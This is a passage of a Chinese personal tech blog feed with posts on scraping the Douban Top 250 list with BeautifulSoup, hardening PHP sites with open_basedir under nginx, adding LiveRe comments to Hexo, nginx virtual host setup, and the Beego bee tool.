        <content type="html"><![CDATA[<h1 id="豆瓣TOP250"><a href="#豆瓣TOP250" class="headerlink" title="豆瓣TOP250"></a>豆瓣TOP250</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>记得当初去参加大数据比赛的时候有个环节是对数据清洗。你可以理解前期已经是做好了，你只需要后期，针对已经获得的数据进行分析。里面就有对电影分析的，还需要针对获取的数据进行作图（matplotlib）。想尝试自己去爬数据并对数据进行清洗分析统计。  </p></blockquote><h2 id="1-网页分析"><a href="#1-网页分析" class="headerlink" title="1. 网页分析"></a>1. 网页分析</h2><p> 站点：<a href="https://movie.douban.com/top250" target="_blank" rel="noopener">豆瓣电影 Top 250</a><br> 并不像爬B站那个一样只需要针对请求API获得的json进行分析。我们需要针对网页（HTML）进行分析，有一个神器登场（Beautiful Soup）。可以从HTML，XML中提取数据的python模块。</p><h3 id="1-1获取网页"><a href="#1-1获取网页" class="headerlink" title="1.1获取网页"></a>1.1获取网页</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- conding:utf-8 -*-</span><span class="token keyword">import</span> requests <span class="token keyword">def</span> <span class="token function">get_html</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">:</span>            data <span class="token operator">=</span> req<span class="token punctuation">.</span>text        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"[-] "</span><span class="token operator">+</span>url <span class="token operator">+</span><span class="token string">" error"</span>     <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>        <span class="token keyword">print</span> e<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    douban_url <span class="token operator">=</span> <span class="token string">"https://movie.douban.com/top250"</span>    get_html<span class="token punctuation">(</span>douban_url<span class="token punctuation">)</span></code></pre><h4 id="如果你想尝试print？？？-stop-你绝对报错的。"><a href="#如果你想尝试print？？？-stop-你绝对报错的。" class="headerlink" title="如果你想尝试print？？？ stop!!! 你绝对报错的。"></a>如果你想尝试print？？？ stop!!! 你绝对报错的。</h4><pre><code>&#39;gbk&#39; codec can&#39;t encode character u&#39;\xee&#39; in position 21861: illegal multibyte sequence</code></pre><p> 编码这个东西很玄学的，我也很好奇，网易一般就是UTF-8，我还encode了它？但是还是不行。网上的猜测都是说“本身Unicode类型的字符中，包含了一些无法转换为GBK编码的一些字符。”没关系我们并不需要print出来去看html，浏览器没有更方便？</p><h3 id="1-2-分析网页"><a href="#1-2-分析网页" class="headerlink" title="1.2 分析网页"></a>1.2 分析网页</h3><p><a href="https://image.kalifun.top/upload/1812/9a4fd4c4917b0dc3.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1812/9a4fd4c4917b0dc3.png" alt></a><br>其实可用的信息很多，根据自己想实现的效果来获取具体的信息。<br><a href="https://image.kalifun.top/upload/1812/d86ddf15e5c3d67f.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1812/d86ddf15e5c3d67f.png" alt></a><br> 你会发现整个关于电影的是在ol这个标签里，所以我们所需要这个标签里的代码。</p><pre class=" language-python"><code class="language-python">allmovie <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'ol'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'grid_view'</span><span class="token punctuation">)</span></code></pre><p> 看图片可以看懂每一个电影的信息都在li的标签里。</p><pre class=" language-python"><code class="language-python">movielist <span class="token operator">=</span> allmovie<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'li'</span><span class="token punctuation">)</span></code></pre><h2 id="2-使用beautifulsoup"><a href="#2-使用beautifulsoup" class="headerlink" title="2.使用beautifulsoup"></a>2.使用beautifulsoup</h2><p>contents<br> 根据文档树进行搜索，返回标记对象（tag）的列表,注意，直接.contents，返回的是列表，不是单一元素。使用contents向后遍历树，使用parent向前遍历树</p><pre class=" language-python"><code class="language-python">    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    all_content <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'ol'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'grid_view'</span><span class="token punctuation">)</span>    all_movies <span class="token operator">=</span> all_content<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'li'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> single <span class="token keyword">in</span> all_movies<span class="token punctuation">:</span>        top_num <span class="token operator">=</span> single<span class="token punctuation">.</span>find<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'em'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>string        title <span class="token operator">=</span> single<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'title'</span><span class="token punctuation">)</span>        chiness_name <span class="token operator">=</span> title<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>string        class_bd <span class="token operator">=</span> single<span class="token punctuation">.</span>find<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'bd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contents        movie_yearth <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d{4}'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>class_bd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        movie_rating <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d?\.\d'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>class_bd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        movie_country <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d{4}.*$/'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>class_bd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        movie_eval <span class="token operator">=</span> class_bd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'span'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  </code></pre><p>后续我将html保存到文件中，这样应该可以解决编码报错的问题。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>open_basedir防跨站</title>
      <link href="/2018/11/28/open-basedir-fang-kua-zhan/"/>
      <url>/2018/11/28/open-basedir-fang-kua-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="open-basedir防跨站"><a href="#open-basedir防跨站" class="headerlink" title="open_basedir防跨站"></a>open_basedir防跨站</h1><blockquote><p>多站点时担忧自己因为某个站点因为存在漏洞导致整个网站被沦陷。这里介绍服务权限层的防御（open_basedir）。<br>在搭建网站时请不要直接给站点目录为777权限，及设置目录归属为服务用户，不要为root用户。</p></blockquote><h2 id="1-跨站"><a href="#1-跨站" class="headerlink" title="1.跨站"></a>1.跨站</h2><p>学过信息安全的可能听到跨站很快会想到CSRF,XSS这两个词，但是这里主要说的是不同虚拟主机进行跨站（从A站点目录到B站点目录）。列：当获取A站点的webshell其他站点目录也可以随意进入了。  </p><h2 id="2-open-basedir设置"><a href="#2-open-basedir设置" class="headerlink" title="2.open_basedir设置"></a>2.open_basedir设置</h2><h3 id="2-1-fastcgi-conf"><a href="#2-1-fastcgi-conf" class="headerlink" title="2.1 fastcgi.conf"></a>2.1 fastcgi.conf</h3><p>我们可以查看nginx.conf目录下有一个fastcgi.conf配置文件。查看最后一行是否有下面代码。</p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">fastcgi_param</span> PHP_ADMIN_VALUE    <span class="token string">"open_basedir=$document_root:/tmp/:/proc/"</span><span class="token punctuation">;</span></code></pre><p>如果没有可以添加在最后一行。<br>在上篇文章我提到虚拟主机配置中有include fastcgi.conf。如果这些都齐全了，重启服务就可以实现了。</p><pre class=" language-nginx"><code class="language-nginx"><span class="token variable">$document_root</span> 这个是我们设置虚拟主机配置文件的站点地址列：    <span class="token punctuation">{</span><span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> xxx<span class="token punctuation">.</span>com<span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span>你的域名，二级域名，ip<span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>html default<span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>php<span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span>默认寻找主页文件<span class="token keyword">root</span>  <span class="token operator">/</span>home<span class="token operator">/</span>www<span class="token operator">/</span>xxx<span class="token punctuation">;</span>    <span class="token variable">$document_root</span><span class="token punctuation">}</span></code></pre><h3 id="2-2-php-ini"><a href="#2-2-php-ini" class="headerlink" title="2.2 php.ini"></a>2.2 php.ini</h3><p>先确认自己php版本是否是5.3.3+，如果是5.3.3+的话可以直接在php.ini后面添加语句。</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">[</span><span class="token constant">HOST</span><span class="token operator">=</span>www<span class="token punctuation">.</span>asite<span class="token punctuation">.</span>com<span class="token punctuation">]</span>    域名open_basedir<span class="token operator">=</span><span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span>asite<span class="token operator">/</span><span class="token punctuation">:</span><span class="token operator">/</span>tmp<span class="token operator">/</span>     一定需要在asite后面加入<span class="token operator">/</span>，不然可以遍历<span class="token punctuation">[</span><span class="token constant">PATH</span><span class="token operator">=</span><span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span>asite<span class="token punctuation">]</span>open_basedir<span class="token operator">=</span><span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span>asite<span class="token operator">/</span><span class="token punctuation">:</span><span class="token operator">/</span>tmp<span class="token operator">/</span></code></pre><p>请在填写open_basedir地址时以/结束目录。如果你是site1,site2这样来设置自己站点目录名称将可以绕过。  </p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>open_basedir这个并不能完全可靠，可能会被绕过。可以给每个站点单独开php-fpm,这样一个站点被沦陷也无法被利用。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo加入评论功能(来必力)</title>
      <link href="/2018/11/28/hexo-jia-ru-ping-lun-gong-neng-lai-bi-li/"/>
      <url>/2018/11/28/hexo-jia-ru-ping-lun-gong-neng-lai-bi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo加入评论功能-来必力"><a href="#hexo加入评论功能-来必力" class="headerlink" title="hexo加入评论功能(来必力)"></a>hexo加入评论功能(来必力)</h1><p><img src="http://image.kalifun.top/upload/1811/e1473e15e5c7d305.png" alt="laibili"></p><h2 id="1-登录注册"><a href="#1-登录注册" class="headerlink" title="1.登录注册"></a>1.登录注册</h2><p> <a href="https://www.livere.com/" target="_blank" rel="noopener">来必力</a>，如何登录注册我就不冗余了，随便搞个邮箱什么的就可以了。  </p><h2 id="2-来必力配置"><a href="#2-来必力配置" class="headerlink" title="2.来必力配置"></a>2.来必力配置</h2><p> 来到代码管理选择一般网站里面有一个data-uid<br> 再来到你主题目录下有一个_config.yml，进行搜索查找关键词livere_uid</p><pre><code>livere_uid : xxxxxxxxxxxxx</code></pre><h3 id="然后提交代码到github就实现功能了。"><a href="#然后提交代码到github就实现功能了。" class="headerlink" title="然后提交代码到github就实现功能了。"></a>然后提交代码到github就实现功能了。</h3><pre><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p> 上面是主题支持来必力功能的。<br>如果不支持，那百度找找吧，我也没测试过，就不给教程了。<br>还有这个是一个韩国人的东西，如果抵制的话，那就弃坑选择其他的评论插件吧。</p>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 来必力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx多站点也变得轻松起来（虚拟主机）</title>
      <link href="/2018/11/27/nginx-duo-zhan-dian-ye-bian-de-qing-song-qi-lai-xu-ni-zhu-ji/"/>
      <url>/2018/11/27/nginx-duo-zhan-dian-ye-bian-de-qing-song-qi-lai-xu-ni-zhu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx多站点也变得轻松起来（虚拟主机）"><a href="#Nginx多站点也变得轻松起来（虚拟主机）" class="headerlink" title="Nginx多站点也变得轻松起来（虚拟主机）"></a>Nginx多站点也变得轻松起来（虚拟主机）</h1><h2 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="1.Nginx"></a>1.<a href="http://nginx.org/en/" target="_blank" rel="noopener">Nginx</a></h2><blockquote><p>Nginx是<a href="https://baike.baidu.com/item/WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fr=aladdin" target="_blank" rel="noopener">WEB服务器</a>，常见的还有<a href="http://www.apache.org/" target="_blank" rel="noopener">Apache</a>.这里我就不过多去说两个的优缺点，如果不的站点计划使用Nginx希望可以对你有帮助。</p></blockquote><h2 id="2-环境介绍"><a href="#2-环境介绍" class="headerlink" title="2.环境介绍"></a>2.环境介绍</h2><ul><li>系统：Linux</li><li>Web服务器：Nginx</li><li>数据库 ：<a href="https://mariadb.org/" target="_blank" rel="noopener">MariaDB</a></li><li>脚本语言：PHP</li></ul><p>你可以每个程序下载安装，然后配置连接好。还有一种方案就是一键安装环境。</p><p><a href="https://lnmp.org/" target="_blank" rel="noopener">LNMP</a>，<a href="https://oneinstack.com/" target="_blank" rel="noopener">OneinStack</a>这样你无需烦恼如何去配置环境，一键帮你搞定。如果是企业级建议手动安装每一个程序。如果你不是安装lnmp环境的话，你可以选择OneinStack,它有很多组合选择。</p><h2 id="3-配置"><a href="#3-配置" class="headerlink" title="3.配置"></a>3.配置</h2><h3 id="3-1首先查看nginx-conf文件。在最后几行你会看到"><a href="#3-1首先查看nginx-conf文件。在最后几行你会看到" class="headerlink" title="3.1首先查看nginx.conf文件。在最后几行你会看到"></a>3.1首先查看nginx.conf文件。在最后几行你会看到</h3><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">include</span>  host<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span></code></pre><h3 id="3-2如果未能找到你可以在最后面添加"><a href="#3-2如果未能找到你可以在最后面添加" class="headerlink" title="3.2如果未能找到你可以在最后面添加"></a>3.2如果未能找到你可以在最后面添加</h3><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">include</span> host<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span></code></pre><p>并在nginx.conf文件目录下创建host这个目录。</p><h3 id="3-3创建虚拟主机配置文件"><a href="#3-3创建虚拟主机配置文件" class="headerlink" title="3.3创建虚拟主机配置文件"></a>3.3创建虚拟主机配置文件</h3><h3 id="xxx-conf"><a href="#xxx-conf" class="headerlink" title="xxx.conf"></a>xxx.conf</h3><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span><span class="token punctuation">{</span><span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> xxx<span class="token punctuation">.</span>com<span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span>你的域名，二级域名，ip<span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>html default<span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>php<span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span>默认寻找主页文件<span class="token keyword">root</span>  <span class="token operator">/</span>home<span class="token operator">/</span>www<span class="token operator">/</span>xxx<span class="token punctuation">;</span>       <span class="token operator">/</span><span class="token operator">/</span>站点的目录地址<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>php<span class="token operator">|</span>php5<span class="token punctuation">)</span><span class="token operator">?</span>$        <span class="token punctuation">{</span><span class="token keyword">fastcgi_pass</span>  unix<span class="token punctuation">:</span><span class="token operator">/</span>tmp<span class="token operator">/</span>php<span class="token operator">-</span>cgi<span class="token punctuation">.</span>sock<span class="token punctuation">;</span><span class="token keyword">fastcgi_index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span><span class="token keyword">include</span> fastcgi<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">}</span><span class="token keyword">location</span> <span class="token operator">/</span>status <span class="token punctuation">{</span><span class="token keyword">stub_status</span> on<span class="token punctuation">;</span><span class="token keyword">access_log</span>   off<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">location</span> <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>gif<span class="token operator">|</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>png<span class="token operator">|</span>bmp<span class="token operator">|</span>swf<span class="token punctuation">)</span>$<span class="token punctuation">{</span><span class="token keyword">expires</span>      30d<span class="token punctuation">;</span>   <span class="token operator">/</span><span class="token operator">/</span>对于不怎么更新站点静态文件的话，可以把时间设大，让浏览器缓存降低对服务器流量带宽的压力。<span class="token punctuation">}</span><span class="token keyword">location</span> <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>js<span class="token operator">|</span>css<span class="token punctuation">)</span><span class="token operator">?</span>$<span class="token punctuation">{</span><span class="token keyword">expires</span>      12h<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">access_log</span> off<span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>这里你可以配置地址及文件名称，对网站访问日志感谢可以开启，说不定也能查问题。<span class="token comment" spellcheck="true">#access_log logs/access.log main;   根据这个格式来修改。</span><span class="token punctuation">}</span></code></pre><p>在host目录下可以创建多个文件，看你自己需要什么。不管是一级域名还是二级域名，还是多个域名都可以。</p><p>后期我可能会在基础上更新一些相关网站策略，负责均衡，HTTPS文章。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beego</title>
      <link href="/2018/11/22/beego/"/>
      <url>/2018/11/22/beego/</url>
      
        <content type="html"><![CDATA[<h1 id="Beego"><a href="#Beego" class="headerlink" title="Beego"></a>Beego</h1><h2 id="bee工具简介"><a href="#bee工具简介" class="headerlink" title="bee工具简介"></a>bee工具简介</h2><h3 id="bee工具是一个为了协助开发beego项目而创建的项目。"><a href="#bee工具是一个为了协助开发beego项目而创建的项目。" class="headerlink" title="bee工具是一个为了协助开发beego项目而创建的项目。"></a>bee工具是一个为了协助开发<a href="https://beego.me/" target="_blank" rel="noopener">beego</a>项目而创建的项目。</h3><h2 id="bee安装"><a href="#bee安装" class="headerlink" title="bee安装"></a>bee安装</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get github<span class="token punctuation">.</span>com<span class="token operator">/</span>beego<span class="token operator">/</span>bee</code></pre><h4 id="安装完之后，bee可执行文件默认放到-GOPATH-bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。"><a href="#安装完之后，bee可执行文件默认放到-GOPATH-bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。" class="headerlink" title="安装完之后，bee可执行文件默认放到$GOPATH/bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。"></a>安装完之后，bee可执行文件默认放到$GOPATH/bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'export GOPATH=""'</span> <span class="token operator">>></span> ~/.zshrc<span class="token keyword">echo</span> <span class="token string">'export PATH="<span class="token variable">$GOPATH</span>/bin:<span class="token variable">$PATH</span>"'</span> <span class="token operator">>></span> ~/.zshrc</code></pre><h2 id="bee工具命令详解"><a href="#bee工具命令详解" class="headerlink" title="bee工具命令详解"></a>bee工具命令详解</h2><h3 id="bee命令"><a href="#bee命令" class="headerlink" title="bee命令"></a>bee命令</h3><pre class=" language-bash"><code class="language-bash">$ beeBee is a Fast and Flexible tool <span class="token keyword">for</span> managing your Beego Web Application.USAGE    bee <span class="token function">command</span> <span class="token punctuation">[</span>arguments<span class="token punctuation">]</span>AVAILABLE COMMANDS    version     Prints the current Bee version    migrate     Runs database migrations    api         Creates a Beego API application    bale        Transforms non-Go files to Go <span class="token function">source</span> files    fix         Fixes your application by making it compatible with newer versions of Beego    dlv         Start a debugging session using Delve    dockerize   Generates a Dockerfile <span class="token keyword">for</span> your Beego application    generate    Source code generator    hprose      Creates an RPC application based on Hprose and Beego frameworks    new         Creates a Beego application    pack        Compresses a Beego application into a single <span class="token function">file</span>    rs          Run customized scripts    run         Run the application by starting a local development server    server      serving static content over HTTP on portUse bee <span class="token function">help</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token function">more</span> information about a command.ADDITIONAL HELP TOPICSUse bee <span class="token function">help</span> <span class="token punctuation">[</span>topic<span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token function">more</span> information about that topic.</code></pre><h3 id="new命令"><a href="#new命令" class="headerlink" title="new命令"></a>new命令</h3><h4 id="new命令是用来新建一个web项目，我们执行bee-new-lt-项目名称-gt-。将会在-GOPATH-src目录下创建文件夹。"><a href="#new命令是用来新建一个web项目，我们执行bee-new-lt-项目名称-gt-。将会在-GOPATH-src目录下创建文件夹。" class="headerlink" title="new命令是用来新建一个web项目，我们执行bee new &lt;项目名称&gt;。将会在$GOPATH/src目录下创建文件夹。"></a>new命令是用来新建一个web项目，我们执行<code>bee new &lt;项目名称&gt;</code>。将会在$GOPATH/src目录下创建文件夹。</h4><pre class=" language-go"><code class="language-go">$ bee <span class="token builtin">new</span> beeg______<span class="token operator">|</span> ___ \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span>  ___   ___<span class="token operator">|</span> ___ \ <span class="token operator">/</span> <span class="token boolean">_</span> \ <span class="token operator">/</span> <span class="token boolean">_</span> \<span class="token operator">|</span> <span class="token operator">|</span><span class="token boolean">_</span><span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span><span class="token operator">|</span>  __<span class="token operator">/</span>\____<span class="token operator">/</span>  \___<span class="token operator">|</span> \___<span class="token operator">|</span> v1<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">44</span> WARN     ▶ <span class="token number">0001</span> You current workdir is not inside $GOPATH<span class="token operator">/</span>src<span class="token punctuation">.</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">44</span> INFO     ▶ <span class="token number">0002</span> Creating application<span class="token operator">...</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>conf<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>models<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>routers<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>tests<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>static<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>static<span class="token operator">/</span>js<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>static<span class="token operator">/</span>css<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>static<span class="token operator">/</span>img<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>views<span class="token operator">/</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>conf<span class="token operator">/</span>app<span class="token punctuation">.</span>conf    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>controllers<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>views<span class="token operator">/</span>index<span class="token punctuation">.</span>tpl    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>routers<span class="token operator">/</span>router<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>tests<span class="token operator">/</span>default_test<span class="token punctuation">.</span><span class="token keyword">go</span>    create     <span class="token operator">/</span>Users<span class="token operator">/</span>fun<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>src<span class="token operator">/</span>beeg<span class="token operator">/</span>main<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">31</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">44</span> SUCCESS  ▶ <span class="token number">0003</span> New application successfully created<span class="token operator">!</span></code></pre><pre><code>├── conf│   └── app.conf├── controllers│   └── default.go├── main.go├── models├── routers│   └── router.go├── static│   ├── css│   ├── img│   └── js│   └── reload.min.js├── tests│   └── default_test.go└── views    └── index.tpl</code></pre><h3 id="api命令"><a href="#api命令" 